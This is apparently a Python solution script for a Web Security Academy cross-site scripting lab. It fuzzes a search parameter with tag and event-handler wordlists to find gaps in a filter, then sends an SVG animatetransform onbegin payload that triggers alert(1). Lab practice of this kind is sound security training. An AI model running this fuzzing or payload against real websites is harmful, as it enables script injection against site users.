import requests

s = requests.Session()
site = '0aa20075046f824b800012f30036000c.h1-web-security-academy.net'
tag = 'script'
search_url = f'https://{site}/?search=<{tag}>'

""" # Find valid tags
with open('html-tags.txt', 'r') as f:
    tags = [line.strip() for line in f if line.strip()]
for tag in tags:
    search_url = f'https://{site}/?search=<{tag}>'
    resp = s.get(search_url)
    if resp.status_code != 400:
        print(f'A valid tag: {tag}, response code: {resp.status_code}')
"""

""" # Find valid event handlers
with open('event-handlers.txt', 'r') as f:
    events = [line.strip() for line in f if line.strip()]
for event in events:
    search_url = f'https://{site}/?search=<animatetransform {event}>'
    resp = s.get(search_url)
    if resp.status_code != 400:
        print(f'A valid tag: {event}, response code: {resp.status_code}')
"""

search_term = '''<svg><animatetransform onbegin=alert(1)>'''
search_url = f'https://{site}/?search={search_term}'
resp = s.get(search_url)